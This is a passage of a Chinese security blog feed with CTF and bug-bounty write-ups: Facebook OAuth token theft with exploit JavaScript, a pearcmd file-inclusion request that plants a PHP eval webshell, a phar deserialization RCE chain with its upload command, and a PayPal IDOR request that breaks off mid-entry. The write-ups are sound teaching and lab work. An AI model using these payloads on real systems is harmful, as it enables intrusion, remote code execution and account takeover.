<p>构造完 payload 后, 重进一次主页就能看到 flag 了:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</title>
    <url>/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/</url>
    <content><![CDATA[<h1 id="【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01"><a href="#【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01" class="headerlink" title="【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01"></a>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</h1><p>信息来源: <a href="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/">https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>第三方网站如(Instagram)是可以通过 Facebook 账号进行登录的, 具体登录逻辑就是利用 Facebook 提供的 SDK,使用 OAuth 授权进行登录。</p>
<p>具体来说就是用户登录 ins, 然后 ins 会根据 FaceBook 的 SDK 规范, 跳转到 Facebook 对应的登录页面, Facebook 登录完成之后, 返回一个 access_token 给 ins, 完成登录。</p>
<p>黑客在这个 OAuth 授权流程能够<strong>窃取 access_token</strong> ,从而达到接管用户账号的目的。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p> 在 Facebook 提供给开发者接入的 SDK 中, 有一个名为 “&#x2F;connect&#x2F;ping” 的登录服务端, 它是提供给第三方应用获取用户访问令牌的第三方端点, 具体逻辑是开发者通过编码在后台创建跨域通信的代理 <code>iframe</code> , 再使用 <code>window.postMessage()</code> 方法接收令牌, 在接收令牌后, 该 API 会把链接跳转指向 Facebook 的 “XD_Arbiter” 下。 完整的 URL 为(以 ins 为例):</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.facebook.com/connect/ping?client_id=APP_ID&amp;redirect_uri=https://staticxx.facebook.com/connect/xd_arbiter.php?version=42#origin=https://www.instagram.com</span><br></pre></td></tr></table></figure>

<p> 这里的 <code>APP_ID</code> 是第三方应用在 Facebook 注册时生成的应用 ID 值。</p>
<p> 攻击者发现这里的 <code>xd_arbiter.php?version=42</code> 可以被<strong>篡改</strong>成 <code>xd_arbiter/?version=42</code> , 然后在此基础下, 能够将目录附加到后面实现资源访问。</p>
<p>在这里由于通过上述目录获取到的 <code>access_token</code> 的相关值都是哈希片段, 很难去还原, 但是攻击者在 <code>page_proxy</code> 目录中发现了一个名为 <code>7SWBAvHenEn.js</code> 的 js 文件, 这个文件中包含如下内容:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> frameName = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">split</span>(<span class="string">&quot;#&quot;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(frameName,<span class="string">&quot;*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>第一行代码会获取 URL 请求参数中 <code>#</code> 后面的内容, 将它赋值给 <code>frameName</code> , 然后调用 <code>window.parent.postMessage</code> 转发来自 <code>frameName</code> 发送的内容, 这里的 <code>*</code> 代表他可以接收任意源的请求。</p>
<p>然后攻击者构造 URL 为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://staticxx.facebook.com/connect/xd_arbiter/r/7SWBAvHenEn.js?version=42</span><br></pre></td></tr></table></figure>
<p>就可以穿越访问到这个文件, 再通过 <code>#</code> 去指定源, 就可以拦截该源发送回来的 <code>access_token</code> .</p>
<p>这个 js 文件能够被攻击者利用, 原因如下:</p>
<ol>
<li>攻击者能够通过资源附加访问到这个文件.</li>
<li><code>postMessage()</code> 方法会发送未加密的令牌.</li>
<li><code>*</code> 允许了攻击者能在自己的源 ip 下请求并获取响应.</li>
<li>API 请求中没有验证 <code>X-Frame-Options</code> 标题,导致能够在 <code>xd_arbiter</code> 中嵌入跨域嵌套 <code>postMessage()</code> 回显的窗口.</li>
<li><code>window.parent</code> 下的方法不用与用户交互, 不需要关心<code>window.open</code>或任何<code>onClick</code>事件.</li>
</ol>
<h2 id="漏洞劫持"><a href="#漏洞劫持" class="headerlink" title="漏洞劫持"></a>漏洞劫持</h2><p>最后攻击者重写 <code>Custom_SDK.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app_id = <span class="string">&#x27;124024574287414&#x27;</span>,</span><br><span class="line">app_domain = <span class="string">&#x27;www.instagram.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> exploit_url = <span class="string">&#x27;https://www.facebook.com/connect/ping?client_id=&#x27;</span> + app_id + <span class="string">&#x27;&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7SWBAvHenEn.js%3Fversion%3D44%23origin%3Dhttps%253A%252F%252F&#x27;</span> + app_domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;display:none;&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, exploit_url);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;OAuth&#x27;</span>, <span class="keyword">function</span>(<span class="params">FB</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="variable constant_">FB</span>.<span class="property">data</span>.<span class="property">name</span>);</span><br><span class="line">&#125;, !<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>实现跨域攻击, 接管账户.</p>
<h2 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h2><p>作为防守方, 仅仅使用 URL 白名单来防御是不够的, 在面对跨域通信, 不同设备甚至浏览器的情况下, 即使使用了 <code>X-Frame-Options</code> 来防止跨域请求, 也有可能会因为兼容性问题产生漏洞.</p>
<p>在这里的启示就是, 应用设计时, 在实现功能的前提下, 要尽可能遵循简单原则, 参考标准协议实现流程, <strong>线上环境不使用的文件, 要尽快清除</strong>.</p>
]]></content>
      <categories>
        <category>API安全</category>
        <category>漏洞剖析</category>
      </categories>
      <tags>
        <tag>API 安全</tag>
        <tag>OAuth</tag>
        <tag>跨域劫持</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</title>
    <url>/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】-Include🍐-pearcmd-文件包含"><a href="#【NewStarCTF2023】-Include🍐-pearcmd-文件包含" class="headerlink" title="【NewStarCTF2023】 Include🍐 pearcmd 文件包含"></a>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>进入靶机, 看到代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释提示我们去看 <code>phpinfo.php</code> , 路径输入, 可以看到 phpinfo(), 然后看到有一个 Flag 字段, 里面写着 <code>fake&#123;Check_register_argc_argv&#125;</code> 又是提示, 直接搜这个字段, 发现 <code>register_argc_argv = ON</code>, 再加上题目源码提示,那就很明显是 pear 文件包含漏洞了.</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h3><p>首先先来介绍一下 pear, pear的全称为<code>PHP Extension and Application Repository</code>，中文翻译为php扩展和应用仓库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复造轮子.</p>
<p>可以通过 pear 命令往 php 目录中下载内容(出网下载), 也可以使用 pear 命令创建内容(不出网).</p>
<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p><code>register_argc_argv</code> 是 <code>php.ini</code> 里面的一个选项，默认为OFF，如果被设置成 ON, 那么就能获得以下权利:</p>
<ol>
<li>在命令行模式下, 通过 <code>$_SERVER[‘argv’]</code> 获得命令行参数</li>
<li>在 Web 模式下, 可以在 URL 里嵌入 <code>+</code> 号, 其中会将<code>+</code> 号链接的参数的个数存入 <code>argc</code>, 各个参数的值存入 <code>argv</code>.</li>
</ol>
<h3 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h3><p>在 <code>pearcmd.php</code> 中, 会有逻辑尝试 <code>argv</code> 变量, 再尝试 <code>_SERVER[&#39;argv&#39;]</code> , 其中<code>_SERVER[&#39;argv&#39;]</code> 是我们可以控制的变量, 最后会把 <code>_SERVER[&#39;argv&#39;]</code> 给 return 出来, 所以我们这里可以在文件包含中获取的我们在 GET 里传递的参数了.</p>
<p>这里使用 <code>config-create</code> 来在本地指定目录创建文件, 然后用 <code>+</code> 代替空格, 构造请求如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/process.jpg"></p>
<p>连接蚁剑, 即可 getshell.</p>
<p><img src="/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>pear</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Unserialize Again phar 文件反序列化</title>
    <url>/2023/11/08/NewStarCTF2023-Unserialize-Again/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Unserialize-Again-phar-文件反序列化"><a href="#【NewStarCTF2023】Unserialize-Again-phar-文件反序列化" class="headerlink" title="【NewStarCTF2023】Unserialize Again phar 文件反序列化"></a>【NewStarCTF2023】Unserialize Again phar 文件反序列化</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>打开靶机后,进入页面就一个文件上传,然后抓包看源码提示我们看 cookies,然后 cookies 里面有 pairing.php, 访问之后得到题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>这个类这么长,只有 <code>__destruct()</code> 部分是有用的, 解题思路就是触发反序列化,然后在__destruct()函数实现 RCE.</p>
<h3 id="wakeup-绕过部分"><a href="#wakeup-绕过部分" class="headerlink" title="__wakeup 绕过部分"></a>__wakeup 绕过部分</h3><p>这里的 <code>__wakeup()</code> 函数会强制更改 user 的值,导致我们无法 RCE,至于 <code>__construct()</code> 构造函数, 如果类是反序列化构造的,那么就默认不会触发构造函数,不用管他就好,所以这里仅需要绕过 <code>__wakeup()</code>。‘</p>
<p>先来了解 <code>__wakeup()</code> 函数。</p>
<p><code>__wakeup()</code> 函数在反序列过程中会最先调用,这是因为如果对象在被序列化时持有对数据库连接、文件句柄或网络连接的引用，这些资源在序列化时不会被保存，因为它们通常是资源指针。当对象被反序列化时， <code>__wakeup()</code> 方法会重新建立这些连接。</p>
<p><code>__wakeup()</code> 通常在所有属性都恢复后执行。因此在 PHP 中如果序列化字符串被篡改，例如故意声明错误的属性数(实际 4 个属性,却声明了 5 个), PHP 无法成功恢复 5 个变量,就会跳过 <code>__wakeup()</code> 的执行。</p>
<p>所以这里序列化构造为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>然后更改一下属性的个数就好。</p>
<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>注意到代码 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line"><span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码的逻辑是, 从 GET 中取出 <code>pear</code> 的值, 然后通过<code>php://input</code> 读取 POST 过来的内容, 然后生成以 <code>pear</code> 的值命名, POST 为内容的文件, 文件会存放在当前目录下, 之后通过 GET 传入的 <code>apple</code> 来指定文件调用 <code>file_exists()</code> 。</p>
<p><code>file_exists()</code> 函数是个魔法函数, 当他读取 phar 文件时, 如果 phar 文件存在 <code>.metadata</code> , 他就会对里面的内容执行反序列化。</p>
<p>所以思路很明显,这里我们需要构造一个 phar 文件,上传,然后通过 <code>file_exists()</code> 执行反序列化实现 RCE。</p>
<h3 id="phar-文件签名绕过"><a href="#phar-文件签名绕过" class="headerlink" title="phar 文件签名绕过"></a>phar 文件签名绕过</h3><p>由于需要绕过 <code>__wakeup()</code> 函数, 我们要更改 phar 文件里面序列化的内容, 但是按照我的构造 phar 文件的方法,在 phar 文件在生成后, 是会根据 phar 文件的内容生成一个<strong>签名</strong>的, 如果我们篡改生成的 phar 文件,会导致签名校验不通过, 无法被识别成一个正确的 phar 文件,也就不会触发反序列化.</p>
<p>这里绕过签名的方式有两种:</p>
<ol>
<li>修改数据后再手动生成签名</li>
<li>tar压缩绕过</li>
</ol>
<p>我的做法是<strong>tar压缩绕过</strong>, 手动生成签名的方法会在文末再讨论.</p>
<p>这里引用了文章 <a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a> 的内容。</p>
<p>phar 文件在经过 tar 压缩后,反序列化过程中会跳过签名的验证。原因是对于 gzip,bzip 文件, php 内置的 phar 文件读取函数在碰到他们的时候会调用对应的过滤器直接对他们做解压处理,然后在去反序列化解压后的内容,这个过程是会验证签名有效性的。而对于 tar 文件, 他会检查 tar 压缩包的内容是否有 <code>.phar/.metadata</code>, 如果有就会直接对 <code>metadata</code> 的内容进行反序列化, 并没有验证其签名。</p>
<p><strong>请注意该博主对分析 tar 文件时使用的 PHP 版本为 PHP7.2, 本文并没有验证 7.2 以后的 PHP 版本是否有修复该漏洞</strong></p>
<p>本题中的 PHP 版本为 PHP&#x2F;7.0.9, 所以确保能够使用 tar 压缩绕过签名验证。</p>
<p>这里在这里我没有使用 php 代码生成 phar 文件, 我选择去模拟phar 文件的构造,同时里面如果没有签名也是合法的(因为根本就不会检查,如果有签名,tar 作为一个外部的命令行工具,不知道 phar 文件的构造细节,直接 tar 压缩可能无法被反序列化执行), 这里需要在本地创建一个名为 <code>.phar</code> 的文件夹, 然后在文件夹里创建名为 <code>.metadata</code> 的文件, 通过 vim 打开, 将序列化结构粘贴到里面,然后保存。之后调用以下命令生成 tar 文件:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">tar -cf phar.tar .phar/</span><br></pre></td></tr></table></figure>


<p>生成 tar 文件后, 在 POST 上传即可(这里用了 curl -T 上传文件, 因为 burp 不好搞格式):</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST -T &quot;/Users/a214/Desktop/phar.tar&quot; &quot;http://f5c944ec-<span class="number">37</span>e2-<span class="number">4182</span>-bcaf-e7f3441012c9.node4.buuoj.cn:<span class="number">81</span>/pairing.php?pear=a.phar&amp;apple=phar://a.phar&quot; --header &quot;Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded&quot;</span><br></pre></td></tr></table></figure>

<p>最后上传就能 RCE 了, ls 看到 flag 名字后 cat 就能得到结果:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/result.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解使用重写 phar 文件签名的形式, 去上传文件。但是本人在复现的过程中, 缕缕碰壁, 在这里记录我的踩坑历史。</p>
<h3 id="使用-010editor-或者其他二进制工具编辑-phar-文件"><a href="#使用-010editor-或者其他二进制工具编辑-phar-文件" class="headerlink" title="使用 010editor 或者其他二进制工具编辑 phar 文件"></a>使用 010editor 或者其他二进制工具编辑 phar 文件</h3><p>一般的文本编辑器,包括 vim, vscode, 自带的记事本再保存的时候都会更改文件的编码格式,导致再发送的过程中无法被正确识别成 phar 文件。</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image.png"></p>
<h3 id="在修改前请确认签名所使用的加密格式"><a href="#在修改前请确认签名所使用的加密格式" class="headerlink" title="在修改前请确认签名所使用的加密格式"></a>在修改前请确认签名所使用的加密格式</h3><p>网上包括官方题解的代码都是用 SHA1 进行加密, 一直不能通过, 这一点我卡了很久, 知道我仔细看:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-1.png"></p>
<p>这里的签名怎么是 32 个字节的, 一般的 SHA1 在加密后是 20 个字节, <strong>SHA256</strong>加密后是 32 个字节, 所以这类由于未知原因,本人本地 php 环境生成的 phar 文件是用<strong>SHA256</strong>进行加密的, 我们需要更改代码让他去用 SHA256 进行加密, 以下是更改后的加密代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/a214/Documents/IntelliJ/unserialize/a.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">40</span>] <span class="comment"># 32+8</span></span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 sha256 替换 sha1</span></span><br><span class="line">sig = hashlib.sha256(text).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入新文件时，包括了新的签名和文件末尾的非签名数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(text + sig + end)</span><br></pre></td></tr></table></figure>

<p>更改后上传文件, 就能拿到 flag 了:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-2.png"></p>
<p>这里总结一下签名的加密格式:</p>
<p>签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1</p>
<p>下次在改签名时记得检验一下加密格式。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>phar</tag>
        <tag>反序列化</tag>
        <tag>签名加密</tag>
      </tags>
  </entry>
  <entry>
    <title>【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30</title>
    <url>/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【API安全漏洞学习】Paypal-IDOR-漏洞-2019-7-30"><a href="#【API安全漏洞学习】Paypal-IDOR-漏洞-2019-7-30" class="headerlink" title="【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30"></a>【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Paypal 平台中存在企业账号与对应的子账号, 企业账号通过委托授权子账号来管理账号上的资金, 对于不同的子账号拥有<strong>不同的权限和功能</strong>.<br>用一张图来理解就是:</p>
<p><img src="/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/image.png"></p>
<p>攻击者发现在这个 Paypal 的这个功能中存在 IDOR<br> 漏洞, 能够通过实现子账号间越权访问.</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>IDOR (Insecure Direct Object Reference), 又对象级授权问题, 它涉及到对Web应用程序或API中对象的不安全引用。这些对象通常是数据库记录、文件、目录等。当应用程序提供对这些对象的直接访问，并且没有适当地实施访问控制时，就会产生IDOR漏洞。</p>
<p>常见的 IDOR 漏洞有:</p>
<ol>
<li>用户数据泄露: 通过修改 URL 中的 ID 获取其他用户的隐私信息, 更严重的包括更改, 删除他人的信息.</li>
<li>文件访问和泄露: 对于本没有权限访问的文件, 通过修改 URL 中文件的编号来越权访问.</li>
</ol>
<p>在本次漏洞中, 攻击这发现“查看子账号”功能中有一个 URL 为 <code>https://www.paypal.com/businessmanage/users/1657893467745278998</code><br>其中 <code>user</code> 后面的 <code>1657893467745278998</code> 是子账号所绑定的企业账号 ID, 紧接着产生一个 HTTP PUT 请求, 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /businessmanage/users/api/v1/users? HTTP/1.1</span><br><span class="line">Host: www.paypal.com</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;1657893467745278998&quot;,&quot;accessPoint&quot;:&#123;&quot;privileges&quot;:[&quot;MANUAL_REFERENCE_TXN&quot;,&quot;VIEW_CUSTOMERS&quot;,&quot;SEND_MONEY&quot;],&quot;id&quot;:&quot;5994224506&quot;,&quot;accounts&quot;:[&quot;attacker@gmail.com&quot;]&#125;,&quot;roleID&quot;:0,&quot;roleName&quot;:&quot;CUSTOM&quot;,&quot;privilegeChanged&quot;:true,&quot;privilegeSecondaryName&quot;:&quot;A1&quot;&#125;]</span><br></pre></td></tr></table></figure>

